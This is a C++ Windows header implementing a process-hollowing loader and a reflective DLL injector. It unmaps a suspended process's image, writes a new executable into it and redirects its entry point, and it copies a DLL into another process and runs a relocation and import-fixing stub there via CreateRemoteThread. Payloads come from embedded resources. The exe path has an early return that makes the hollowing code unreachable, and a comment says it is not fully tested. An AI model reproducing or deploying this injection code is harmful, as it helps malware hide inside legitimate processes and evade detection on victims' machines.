#pragma once
#include <windows.h>

// loading Exe from buffer
HANDLE PLoadExe(LPCWSTR lpPath, LPVOID lpBuffer, DWORD dwLength);
// loading Dll from buffer
bool PLoadDll(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength);

// fix exe structure locally
DWORD WINAPI PFixExe(LPVOID param); // for CreateRemoteThread
DWORD WINAPI _p1stub();
// fix dll structure locally
DWORD WINAPI PFixDll(LPVOID param); // for CreateRemoteThread
DWORD WINAPI _p2stub();
// fix relocations locally from imageBase
void PFixReloc(LPVOID imageBase);
// fix IAT locally from imageBase
void PFixIAT(LPVOID imageBase);

bool PLoadResource(UINT uid, LPVOID& lpBuffer, DWORD& dwLength)
{
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(uid), L"FILE");
	if (hResource == NULL)
		return false;
	HGLOBAL hGlobal = LoadResource(NULL, hResource);
	if (hGlobal == NULL)
		return false;
	lpBuffer = LockResource(hGlobal);
	if (lpBuffer == NULL)
		return false;
	dwLength = SizeofResource(NULL, hResource);
	return true;
}

typedef HMODULE(WINAPI* tpLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* tpGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* tpVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* tpDllMain)(HMODULE, DWORD, LPVOID);

struct PLoaderParam
{
	LPVOID imageBase;
	tpLoadLibraryA fnLoadLibraryA;
	tpGetProcAddress fnGetProcAddress;
	tpVirtualProtect fnVirtualProtect;
};

typedef DWORD(WINAPI* tpNtUnmapViewOfSection)(HANDLE, PVOID);
tpNtUnmapViewOfSection NtUnmapViewOfSection = \
	(tpNtUnmapViewOfSection)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwUnmapViewOfSection");

// not fully tested, maybe not working
HANDLE PLoadExe(LPCWSTR lpPath, LPVOID lpBuffer, DWORD dwLength)
{
	PROCESS_INFORMATION pi{};
	STARTUPINFO si{}; si.cb = sizeof(si);
	if (!CreateProcess(lpPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		return NULL;
	return pi.hThread;
	
	CONTEXT context{}; context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(pi.hThread, &context))
		return NULL;
	LPVOID orgBase{};
	if (!ReadProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &orgBase, sizeof(orgBase), 0))
		return NULL;
	NtUnmapViewOfSection(pi.hProcess, orgBase);
	
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)lpBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpBuffer + dosHeaders->e_lfanew);
	SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
	LPVOID lpRemoteBuffer = VirtualAllocEx(pi.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpRemoteBuffer == NULL)
		return NULL;
	
	// copy header/section
	if (!WriteProcessMemory(pi.hProcess, lpRemoteBuffer, lpBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
		return NULL;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)lpRemoteBuffer + section->VirtualAddress),
			(LPVOID)((DWORD_PTR)lpBuffer + section->PointerToRawData), section->SizeOfRawData, NULL))
			return NULL;
		static const ULONG mapping[] = { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
				PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };
		DWORD oldProtect = 0;
		VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD_PTR)lpRemoteBuffer + section->VirtualAddress),
			section->SizeOfRawData, mapping[section->Characteristics >> 29], &oldProtect);
		++section;
	}
	
	PLoaderParam lp{};
	lp.imageBase = lpRemoteBuffer;
	lp.fnLoadLibraryA = LoadLibraryA;
	lp.fnGetProcAddress = GetProcAddress;
	lp.fnVirtualProtect = VirtualProtect;

	DWORD szRLoader = (DWORD_PTR)_p1stub - (DWORD_PTR)PFixExe;
	LPVOID lpRLoader = VirtualAllocEx(pi.hProcess, NULL, szRLoader, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID lpRLoaderParam = VirtualAllocEx(pi.hProcess, NULL, sizeof(lp), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpRLoader == NULL || lpRLoaderParam == NULL)
		return NULL;
	if (!WriteProcessMemory(pi.hProcess, lpRLoader, PFixExe, szRLoader, NULL))
		return NULL;
	if (!WriteProcessMemory(pi.hProcess, lpRLoaderParam, &lp, sizeof(lp), NULL))
		return NULL;
	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRLoader, lpRLoaderParam, 0, NULL);
	if (hThread == NULL)
		return NULL;
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &lpRemoteBuffer, sizeof(lpRemoteBuffer), NULL))
		return NULL;
	context.Eax = (DWORD_PTR)lpRemoteBuffer + ntHeaders->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, &context);
	
	CloseHandle(pi.hProcess);
	return pi.hThread; // ResumeThread() as the convenience
}

bool PLoadDll(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength)
{
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)lpBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpBuffer + dosHeaders->e_lfanew);
	SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
	LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpRemoteBuffer == NULL)
		return false;
	
	// copy header/section
	if(!WriteProcessMemory(hProcess, lpRemoteBuffer, lpBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
		return false;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		if (!WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)lpRemoteBuffer + section->VirtualAddress),
				(LPVOID)((DWORD_PTR)lpBuffer + section->PointerToRawData), section->SizeOfRawData, NULL))
			return false;
		static const ULONG mapping[] = { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
				PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };
		DWORD oldProtect = 0;
		VirtualProtectEx(hProcess, (LPVOID)((DWORD_PTR)lpRemoteBuffer + section->VirtualAddress),
				section->SizeOfRawData, mapping[section->Characteristics >> 29], &oldProtect);
		++section;
	}
	
	PLoaderParam lp{};
	lp.imageBase = lpRemoteBuffer;
	lp.fnLoadLibraryA = LoadLibraryA;
	lp.fnGetProcAddress = GetProcAddress;
	lp.fnVirtualProtect = VirtualProtect;
	
	DWORD szRLoader = (DWORD_PTR)_p2stub - (DWORD_PTR)PFixDll;
	LPVOID lpRLoader = VirtualAllocEx(hProcess, NULL, szRLoader, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID lpRLoaderParam = VirtualAllocEx(hProcess, NULL, sizeof(lp), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpRLoader == NULL || lpRLoaderParam == NULL)
		return false;
	if (!WriteProcessMemory(hProcess, lpRLoader, PFixDll, szRLoader, NULL))
		return false;
	if (!WriteProcessMemory(hProcess, lpRLoaderParam, &lp, sizeof(lp), NULL))
		return false;
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRLoader, lpRLoaderParam, 0, NULL);
	if (hThread == NULL)
		return false;
	//WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return true;
}

typedef struct BASE_RELOCATION_BLOCK
{
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY
{
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD WINAPI PFixExe(LPVOID param)
{
	PLoaderParam* lp = (PLoaderParam*)param;
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)lp->imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lp->imageBase + dosHeaders->e_lfanew);
	DWORD_PTR deltaImageBase = (DWORD_PTR)lp->imageBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

	// perform image base relocation
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)lp->imageBase;
	DWORD relocationsProcessed = 0;
	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
			if (relocationEntries[i].Type == 0)
				continue;
			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR writePosition = (DWORD_PTR)lp->imageBase + relocationRVA;
			DWORD oldProtect = 0;
			lp->fnVirtualProtect((LPVOID)writePosition, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
			DWORD_PTR* addressToPatch = (DWORD_PTR*)writePosition;
			*addressToPatch += deltaImageBase;
			lp->fnVirtualProtect((LPVOID)writePosition, sizeof(DWORD_PTR), oldProtect, &oldProtect);
		}
	}

	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)lp->imageBase);
	LPCSTR libraryName = NULL;
	HMODULE library = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)(importDescriptor->Name + (DWORD_PTR)lp->imageBase);
		library = lp->fnLoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
			originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)lp->imageBase + importDescriptor->OriginalFirstThunk);
			firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)lp->imageBase + importDescriptor->FirstThunk);
			while (originalFirstThunk->u1.AddressOfData != NULL)
			{
				DWORD oldProtect = 0;
				lp->fnVirtualProtect((LPVOID)(&firstThunk->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
				if (IMAGE_SNAP_BY_ORDINAL(originalFirstThunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(originalFirstThunk->u1.Ordinal);
					firstThunk->u1.Function = (DWORD_PTR)lp->fnGetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)lp->imageBase + \
						originalFirstThunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)lp->fnGetProcAddress(library, functionName->Name);
					firstThunk->u1.Function = functionAddress;
				}
				lp->fnVirtualProtect((LPVOID)(&firstThunk->u1.Function), sizeof(DWORD_PTR), oldProtect, &oldProtect);
				++originalFirstThunk;
				++firstThunk;
			}
		}
		++importDescriptor;
	}

	// completed
	return 0;
}

DWORD WINAPI _p1stub()
{
	return 0;
}

DWORD WINAPI PFixDll(LPVOID param)
{
	PLoaderParam* lp = (PLoaderParam*)param;
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)lp->imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lp->imageBase + dosHeaders->e_lfanew);
	DWORD_PTR deltaImageBase = (DWORD_PTR)lp->imageBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
	
	// perform image base relocation
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)lp->imageBase;
	DWORD relocationsProcessed = 0;
	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
			if (relocationEntries[i].Type == 0)
				continue;
			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR writePosition = (DWORD_PTR)lp->imageBase + relocationRVA;
			DWORD oldProtect = 0;
			lp->fnVirtualProtect((LPVOID)writePosition, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
			DWORD_PTR* addressToPatch = (DWORD_PTR*)writePosition;
			*addressToPatch += deltaImageBase;
			lp->fnVirtualProtect((LPVOID)writePosition, sizeof(DWORD_PTR), oldProtect, &oldProtect);
		}
	}
	
	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)lp->imageBase);
	LPCSTR libraryName = NULL;
	HMODULE library = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)(importDescriptor->Name + (DWORD_PTR)lp->imageBase);
		library = lp->fnLoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
			originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)lp->imageBase + importDescriptor->OriginalFirstThunk);
			firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)lp->imageBase + importDescriptor->FirstThunk);
			while (originalFirstThunk->u1.AddressOfData != NULL)
			{
				DWORD oldProtect = 0;
				lp->fnVirtualProtect((LPVOID)(&firstThunk->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
				if (IMAGE_SNAP_BY_ORDINAL(originalFirstThunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(originalFirstThunk->u1.Ordinal);
					firstThunk->u1.Function = (DWORD_PTR)lp->fnGetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)lp->imageBase + \
																			originalFirstThunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)lp->fnGetProcAddress(library, functionName->Name);
					firstThunk->u1.Function = functionAddress;
				}
				lp->fnVirtualProtect((LPVOID)(&firstThunk->u1.Function), sizeof(DWORD_PTR), oldProtect, &oldProtect);
				++originalFirstThunk;
				++firstThunk;
			}
		}
		++importDescriptor;
	}
	
	// entering DllMain
	tpDllMain DllMain = (tpDllMain)((DWORD_PTR)lp->imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllMain)((HMODULE)lp->imageBase, DLL_PROCESS_ATTACH, NULL);
	return 0;
}

DWORD WINAPI _p2stub()
{
	return 0;
}

// repeated procedure
void PFixReloc(LPVOID imageBase)
{
	// perform image base relocation
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
	DWORD_PTR deltaImageBase = (DWORD_PTR)imageBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
	
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)imageBase;
	DWORD relocationsProcessed = 0;
	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
			if (relocationEntries[i].Type == 0)
				continue;
			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR writePosition = (DWORD_PTR)imageBase + relocationRVA;
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID)writePosition, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
			DWORD_PTR *addressToPatch = (DWORD_PTR*)writePosition;
			*addressToPatch += deltaImageBase;
			VirtualProtect((LPVOID)writePosition, sizeof(DWORD_PTR), oldProtect, &oldProtect);
		}
	}
}

// repeated procedure
void PFixIAT(LPVOID imageBase)
{
	// resolve import address table
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);
	LPCSTR libraryName = NULL;
	HMODULE library = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)(importDescriptor->Name + (DWORD_PTR)imageBase);
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
			originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk);
			firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk);
			while (originalFirstThunk->u1.AddressOfData != NULL)
			{
				DWORD oldProtect = 0;
				VirtualProtect((LPVOID)(&firstThunk->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
				if (IMAGE_SNAP_BY_ORDINAL(originalFirstThunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(originalFirstThunk->u1.Ordinal);
					firstThunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + \
																			originalFirstThunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					firstThunk->u1.Function = functionAddress;
				}
				VirtualProtect((LPVOID)(&firstThunk->u1.Function), sizeof(DWORD_PTR), oldProtect, &oldProtect);
				++originalFirstThunk;
				++firstThunk;
			}
		}
		++importDescriptor;
	}
}

